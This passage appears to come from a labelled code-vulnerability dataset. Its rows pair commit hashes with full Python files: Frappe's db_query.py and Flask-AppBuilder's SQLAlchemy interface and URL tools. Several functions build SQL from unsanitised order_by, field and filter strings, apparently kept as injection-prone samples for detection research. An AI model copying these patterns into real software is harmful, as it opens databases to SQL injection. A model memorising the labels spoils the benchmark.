			list_settings['fields'] = self.list_settings_fields

		update_list_settings(self.doctype, list_settings)

/n/n/n",0
35,35,049d51cdf17b06168b4fe7672be8ce01fff0edd2,"/frappe/model/db_query.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals
""""""build query for doclistview and return results""""""

import frappe, json, copy
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.model.utils.list_settings import get_list_settings, update_list_settings

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_list_settings=False, save_list_settings_fields=False,
		update=None, add_total_row=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, ""read"", user=user):
			raise frappe.PermissionError, self.doctype

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], basestring):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  [""`tab{0}`.`name`"".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.list_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_list_settings:
			self.save_list_settings_fields = save_list_settings_fields
			self.update_list_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = ""where "" + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """"""select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s"""""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != ""`tab"" + self.doctype + ""`"":
					self.fields.append(t + "".name as '%s:name'"" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += "" {join} {child} on ({child}.parent = {main}.name)"".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append(""({0})"".format("" or "".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else """") + \
				 ' or '.join(self.or_conditions)

		self.set_field_tables()

		args.fields = ', '.join(self.fields)

		self.set_order_by(args)
		self.check_sort_by_table(args.order_by)
		args.order_by = args.order_by and ("" order by "" + args.order_by) or """"

		args.group_by = self.group_by and ("" group by "" + self.group_by) or """"

		return args

	def parse_args(self):
		""""""Convert fields and filters from strings to list, dicts""""""
		if isinstance(self.fields, basestring):
			if self.fields == ""*"":
				self.fields = [""*""]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split("","")]

		for filter_name in [""filters"", ""or_filters""]:
			filters = getattr(self, filter_name)
			if isinstance(filters, basestring):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in fdict.iteritems():
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def extract_tables(self):
		""""""extract tables from fields""""""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not (""tab"" in f and ""."" in f) ) or (""locate("" in f): continue


				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			raise frappe.PermissionError, doctype

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		""""""Removes optional columns like `_user_tags`, `_comments` etc. if not in table""""""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, basestring):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append(""("" + match_conditions + "")"")

	def build_filter_conditions(self, filters, conditions):
		""""""build conditions from user filters""""""
		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, basestring):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		""""""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator ""value""
		""""""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator in ('in', 'not in'):
			values = f.value
			if not isinstance(values, (list, tuple)):
				values = values.split("","")

			fallback = ""''""
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '(""{0}"")'.format('"", ""'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get(""fields"", {""fieldname"": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in (""Check"", ""Float"", ""Int"", ""Currency"", ""Percent""):
				can_be_null = False

			if f.operator=='Between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype==""Date"" or df.fieldtype==""Datetime""))):
				value = ""'%s' AND '%s'"" % (
					get_datetime(f.value[0]).strftime(""%Y-%m-%d %H:%M:%S.%f""),
					add_to_date(get_datetime(f.value[1]),days=1).strftime(""%Y-%m-%d %H:%M:%S.%f""))
				fallback = ""'0000-00-00 00:00:00'""
			elif df and df.fieldtype==""Date"":
				value = getdate(f.value).strftime(""%Y-%m-%d"")
				fallback = ""'0000-00-00'""

			elif df and df.fieldtype==""Datetime"":
				value = get_datetime(f.value).strftime(""%Y-%m-%d %H:%M:%S.%f"")
				fallback = ""'0000-00-00 00:00:00'""

			elif df and df.fieldtype==""Time"":
				value = get_time(f.value).strftime(""%H:%M:%S.%f"")
				fallback = ""'00:00:00'""

			elif f.operator in (""like"", ""not like"") or (isinstance(f.value, basestring) and
				(not df or df.fieldtype not in [""Float"", ""Int"", ""Currency"", ""Percent"", ""Check""])):
					value = """" if f.value==None else f.value
					fallback = '""""'

					if f.operator in (""like"", ""not like"") and isinstance(value, basestring):
						# because ""like"" uses backslash (\) for escaping
						value = value.replace(""\\"", ""\\\\"").replace(""%"", ""%%"")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, basestring) and not f.operator=='Between':
				value = '""{0}""'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		""""""add match conditions if applicable""""""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get(""read"") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_(""No permission to read {0}"").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get(""apply_user_permissions"", {}).get(""read""):
				# get user permissions
				user_permissions = frappe.defaults.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get(""user_permission_doctypes"").get(""read""))

			if role_permissions.get(""if_owner"", {}).get(""read""):
				self.match_conditions.append(""`tab{0}`.owner = '{1}'"".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = """"
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = ""(("" + "") or ("".join(self.match_conditions) + ""))""

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  ""({conditions}) or ({shared_condition})"".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """"""`tab{0}`.name in ({1})"""""".format(self.doctype, "", "".join([""'%s'""] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)

		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				condition = 'ifnull(`tab{doctype}`.`{fieldname}`, """")=""""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					condition += """""" or `tab{doctype}`.`{fieldname}` in ({values})"""""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values="", "".join([('""'+frappe.db.escape(v, percent=False)+'""') for v in user_permission_values])
					)
				match_conditions.append(""({condition})"".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append("" and "".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks(""permission_query_conditions"", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return "" and "".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args):
		meta = frappe.get_meta(self.doctype)
		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = """"

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith(""count("")
					or self.fields[0].lower().startswith(""min("")
					or self.fields[0].lower().startswith(""max("")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = ""`tab{0}`.`{1}` {2}"".format(self.doctype, sort_field or ""modified"", sort_order or ""desc"")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = ""`tab{0}`.docstatus asc, {1}"".format(self.doctype, args.order_by)

	def check_sort_by_table(self, order_by):
		if ""."" in order_by:
			tbl = order_by.split('.')[0]
			if tbl not in self.tables:
				if tbl.startswith('`'):
					tbl = tbl[4:-1]
				frappe.throw(_(""Please select atleast 1 column from {0} to sort"").format(tbl))

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if ""_comments"" in r:
				r._comment_count = len(json.loads(r._comments or ""[]""))

	def update_list_settings(self):
		# update list settings if new search
		list_settings = json.loads(get_list_settings(self.doctype) or '{}')
		list_settings['filters'] = self.filters
		list_settings['limit'] = self.limit_page_length
		list_settings['order_by'] = self.order_by

		if self.save_list_settings_fields:
			list_settings['fields'] = self.list_settings_fields

		update_list_settings(self.doctype, list_settings)

/n/n/n",1
154,154,2158db051408e0d66210a99b17c121be008e20b6,"flask_appbuilder/models/sqla/interface.py/n/n# -*- coding: utf-8 -*-
import sys
import logging
import sqlalchemy as sa

from . import filters
from sqlalchemy.orm import joinedload
from sqlalchemy.exc import IntegrityError
from sqlalchemy import func
from sqlalchemy.orm.properties import SynonymProperty

from ..base import BaseInterface
from ..group import GroupByDateYear, GroupByDateMonth, GroupByCol
from ..mixins import FileColumn, ImageColumn
from ...filemanager import FileManager, ImageManager
from ..._compat import as_unicode
from ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \
    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY

log = logging.getLogger(__name__)


def _include_filters(obj):
    for key in filters.__all__:
        if not hasattr(obj, key):
            setattr(obj, key, getattr(filters, key))


class SQLAInterface(BaseInterface):
    """"""
    SQLAModel
    Implements SQLA support methods for views
    """"""
    session = None

    filter_converter_class = filters.SQLAFilterConverter

    def __init__(self, obj, session=None):
        _include_filters(self)
        self.list_columns = dict()
        self.list_properties = dict()

        self.session = session
        # Collect all SQLA columns and properties
        for prop in sa.orm.class_mapper(obj).iterate_properties:
            if type(prop) != SynonymProperty:
                self.list_properties[prop.key] = prop
        for col_name in obj.__mapper__.columns.keys():
            if col_name in self.list_properties:
                self.list_columns[col_name] = obj.__mapper__.columns[col_name]
        super(SQLAInterface, self).__init__(obj)

    @property
    def model_name(self):
        """"""
            Returns the models class name
            useful for auto title on views
        """"""
        return self.obj.__name__

    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):
        if filters:
            query = filters.apply_all(query)
        if order_column != '':
            # if Model has custom decorator **renders('<COL_NAME>')**
            # this decorator will add a property to the method named *_col_name*
            if hasattr(self.obj, order_column):
                if hasattr(getattr(self.obj, order_column), '_col_name'):
                    order_column = getattr(getattr(self.obj, order_column), '_col_name')
            query = query.order_by(""%s %s"" % (order_column, order_direction))
        return query

    def query(self, filters=None, order_column='', order_direction='',
              page=None, page_size=None):
        """"""
            QUERY
            :param filters:
                dict with filters {<col_name>:<value,...}
            :param order_column:
                name of the column to order
            :param order_direction:
                the direction to order <'asc'|'desc'>
            :param page:
                the current page
            :param page_size:
                the current page size

        """"""
        query = self.session.query(self.obj)
        if len(order_column.split('.')) >= 2:
            tmp_order_column = ''
            for join_relation in order_column.split('.')[:-1]:
                model_relation = self.get_related_model(join_relation)
                query = query.join(model_relation)
                # redefine order column name, because relationship can have a different name
                # from the related table name.
                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'
            order_column = tmp_order_column + order_column.split('.')[-1]
        query_count = self.session.query(func.count('*')).select_from(self.obj)

        query_count = self._get_base_query(query=query_count,
                                           filters=filters)
        query = self._get_base_query(query=query,
                                     filters=filters,
                                     order_column=order_column,
                                     order_direction=order_direction)

        count = query_count.scalar()

        if page:
            query = query.offset(page * page_size)
        if page_size:
            query = query.limit(page_size)

        return count, query.all()

    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByCol(group_by, 'Group by')
        return group.apply(query_result)

    def query_month_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group = GroupByDateMonth(group_by, 'Group by Month')
        return group.apply(query_result)

    def query_year_group(self, group_by='', filters=None):
        query = self.session.query(self.obj)
        query = self._get_base_query(query=query, filters=filters)
        query_result = query.all()
        group_year = GroupByDateYear(group_by, 'Group by Year')
        return group_year.apply(query_result)

    """"""
    -----------------------------------------
         FUNCTIONS for Testing TYPES
    -----------------------------------------
    """"""

    def is_image(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, ImageColumn)
        except:
            return False

    def is_file(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, FileColumn)
        except:
            return False

    def is_string(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.String)
        except:
            return False

    def is_text(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Text)
        except:
            return False

    def is_integer(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Integer)
        except:
            return False

    def is_numeric(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)
        except:
            return False

    def is_float(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Float)
        except:
            return False

    def is_boolean(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)
        except:
            return False

    def is_date(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.Date)
        except:
            return False

    def is_datetime(self, col_name):
        try:
            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)
        except:
            return False

    def is_relation(self, col_name):
        try:
            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)
        except:
            return False

    def is_relation_many_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOONE'
        except:
            return False

    def is_relation_many_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'MANYTOMANY'
        except:
            return False

    def is_relation_one_to_one(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOONE'
        except:
            return False

    def is_relation_one_to_many(self, col_name):
        try:
            if self.is_relation(col_name):
                return self.list_properties[col_name].direction.name == 'ONETOMANY'
        except:
            return False

    def is_nullable(self, col_name):
        if self.is_relation_many_to_one(col_name):
            col = self.get_relation_fk(col_name)
            return col.nullable
        try:
            return self.list_columns[col_name].nullable
        except:
            return False

    def is_unique(self, col_name):
        try:
            return self.list_columns[col_name].unique
        except:
            return False

    def is_pk(self, col_name):
        try:
            return self.list_columns[col_name].primary_key
        except:
            return False

    def is_fk(self, col_name):
        try:
            return self.list_columns[col_name].foreign_keys
        except:
            return False

    def get_max_length(self, col_name):
        try:
            col = self.list_columns[col_name]
            if col.type.length:
                return col.type.length
            else:
                return -1
        except:
            return -1

    """"""
    -------------------------------
     FUNCTIONS FOR CRUD OPERATIONS
    -------------------------------
    """"""

    def add(self, item):
        try:
            self.session.add(item)
            self.session.commit()
            self.message = (as_unicode(self.add_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.add_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def edit(self, item):
        try:
            self.session.merge(item)
            self.session.commit()
            self.message = (as_unicode(self.edit_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete(self, item):
        try:
            self._delete_files(item)
            self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    def delete_all(self, items):
        try:
            for item in items:
                self._delete_files(item)
                self.session.delete(item)
            self.session.commit()
            self.message = (as_unicode(self.delete_row_message), 'success')
            return True
        except IntegrityError as e:
            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')
            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))
            self.session.rollback()
            return False
        except Exception as e:
            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')
            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))
            self.session.rollback()
            return False

    """"""
    -----------------------
     FILE HANDLING METHODS
    -----------------------
    """"""

    def _add_files(self, this_request, item):
        fm = FileManager()
        im = ImageManager()
        for file_col in this_request.files:
            if self.is_file(file_col):
                fm.save_file(this_request.files[file_col], getattr(item, file_col))
        for file_col in this_request.files:
            if self.is_image(file_col):
                im.save_file(this_request.files[file_col], getattr(item, file_col))

    def _delete_files(self, item):
        for file_col in self.get_file_column_list():
            if self.is_file(file_col):
                if getattr(item, file_col):
                    fm = FileManager()
                    fm.delete_file(getattr(item, file_col))
        for file_col in self.get_image_column_list():
            if self.is_image(file_col):
                if getattr(item, file_col):
                    im = ImageManager()
                    im.delete_file(getattr(item, file_col))

    """"""
    ------------------------------
     FUNCTIONS FOR RELATED MODELS
    ------------------------------
    """"""

    def get_col_default(self, col_name):
        default = getattr(self.list_columns[col_name], 'default', None)
        if default is not None:
            value = getattr(default, 'arg', None)
            if value is not None:
                if getattr(default, 'is_callable', False):
                    return lambda: default.arg(None)
                else:
                    if not getattr(default, 'is_scalar', True):
                        return None
                return value

    def get_related_model(self, col_name):
        return self.list_properties[col_name].mapper.class_

    def query_model_relation(self, col_name):
        model = self.get_related_model(col_name)
        return self.session.query(model).all()

    def get_related_interface(self, col_name):
        return self.__class__(self.get_related_model(col_name), self.session)

    def get_related_obj(self, col_name, value):
        rel_model = self.get_related_model(col_name)
        return self.session.query(rel_model).get(value)

    def get_related_fks(self, related_views):
        return [view.datamodel.get_related_fk(self.obj) for view in related_views]

    def get_related_fk(self, model):
        for col_name in self.list_properties.keys():
            if self.is_relation(col_name):
                if model == self.get_related_model(col_name):
                    return col_name

    """"""
    ------------- 
     GET METHODS
    -------------
    """"""

    def get_columns_list(self):
        """"""
            Returns all model's columns on SQLA properties
        """"""
        return list(self.list_properties.keys())

    def get_user_columns_list(self):
        """"""
            Returns all model's columns except pk or fk
        """"""
        ret_lst = list()
        for col_name in self.get_columns_list():
            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):
                ret_lst.append(col_name)
        return ret_lst

    # TODO get different solution, more integrated with filters
    def get_search_columns_list(self):
        ret_lst = list()
        for col_name in self.get_columns_list():
            if not self.is_relation(col_name):
                tmp_prop = self.get_property_first_col(col_name).name
                if (not self.is_pk(tmp_prop)) and \
                        (not self.is_fk(tmp_prop)) and \
                        (not self.is_image(col_name)) and \
                        (not self.is_file(col_name)) and \
                        (not self.is_boolean(col_name)):
                    ret_lst.append(col_name)
            else:
                ret_lst.append(col_name)
        return ret_lst

    def get_order_columns_list(self, list_columns=None):
        """"""
            Returns the columns that can be ordered

            :param list_columns: optional list of columns name, if provided will
                use this list only.
        """"""
        ret_lst = list()
        list_columns = list_columns or self.get_columns_list()
        for col_name in list_columns:
            if not self.is_relation(col_name):
                if hasattr(self.obj, col_name):
                    if (not hasattr(getattr(self.obj, col_name), '__call__') or
                            hasattr(getattr(self.obj, col_name), '_col_name')):
                        ret_lst.append(col_name)
                else:
                    ret_lst.append(col_name)
        return ret_lst

    def get_file_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]

    def get_image_column_list(self):
        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]

    def get_property_first_col(self, col_name):
        # support for only one col for pk and fk
        return self.list_properties[col_name].columns[0]

    def get_relation_fk(self, col_name):
        # support for only one col for pk and fk
        return list(self.list_properties[col_name].local_columns)[0]

    def get(self, id, filters=None):
        if filters:
            query = query = self.session.query(self.obj)
            _filters = filters.copy()
            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)
            query = self._get_base_query(query=query, filters=_filters)
            return query.first()
        return self.session.query(self.obj).get(id)

    def get_pk_name(self):
        for col_name in self.list_columns.keys():
            if self.is_pk(col_name):
                return col_name


""""""
    For Retro-Compatibility
""""""
SQLModel = SQLAInterface
/n/n/nflask_appbuilder/urltools.py/n/nimport re
from flask import request


class Stack(object):
    """"""
        Stack data structure will not insert
        equal sequential data
    """"""
    def __init__(self, list=None, size=5):
        self.size = size
        self.data = list or []

    def push(self, item):
        if self.data:
            if item != self.data[len(self.data) - 1]:
                self.data.append(item)
        else:
            self.data.append(item)
        if len(self.data) > self.size:
            self.data.pop(0)

    def pop(self):
        if len(self.data) == 0:
            return None
        return self.data.pop(len(self.data) - 1)

    def to_json(self):
        return self.data


def get_group_by_args():
    """"""
        Get page arguments for group by
    """"""
    group_by = request.args.get('group_by')
    if not group_by: group_by = ''
    return group_by


def get_page_args():
    """"""
        Get page arguments, returns a dictionary
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>

    """"""
    pages = {}
    for arg in request.args:
        re_match = re.findall('page_(.*)', arg)
        if re_match:
            pages[re_match[0]] = int(request.args.get(arg))
    return pages


def get_page_size_args():
    """"""
        Get page size arguments, returns an int
        { <VIEW_NAME>: PAGE_NUMBER }

        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>

    """"""
    page_sizes = {}
    for arg in request.args:
        re_match = re.findall('psize_(.*)', arg)
        if re_match:
            page_sizes[re_match[0]] = int(request.args.get(arg))
    return page_sizes


def get_order_args():
    """"""
        Get order arguments, return a dictionary
        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }

        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'

    """"""
    orders = {}
    for arg in request.args:
        re_match = re.findall('_oc_(.*)', arg)
        if re_match:
            order_direction = request.args.get('_od_' + re_match[0])
            if order_direction in ('asc', 'desc'):
                orders[re_match[0]] = (request.args.get(arg), order_direction)
    return orders


def get_filter_args(filters):
    filters.clear_filters()
    for arg in request.args:
        re_match = re.findall('_flt_(\d)_(.*)', arg)
        if re_match:
            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))
/n/n/n",0
155,155,2158db051408e0d66210a99b17c121be008e20b6,"/flask_appbuilder/models/sqla/interface.py/n/n# -*- coding: utf-8 -*-
import sys
import logging
import sqlalchemy as sa

from . import filters
from sqlalchemy.orm import joinedload
from sqlalchemy.exc import IntegrityError
from sqlalchemy import func
from sqlalchemy.orm.properties import SynonymProperty

from ..base import BaseInterface
from ..group import GroupByDateYear, GroupByDateMonth, GroupByCol
from ..mixins import FileColumn, ImageColumn
from ...filemanager import FileManager, ImageManager
from ..._compat import as_unicode
from ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \
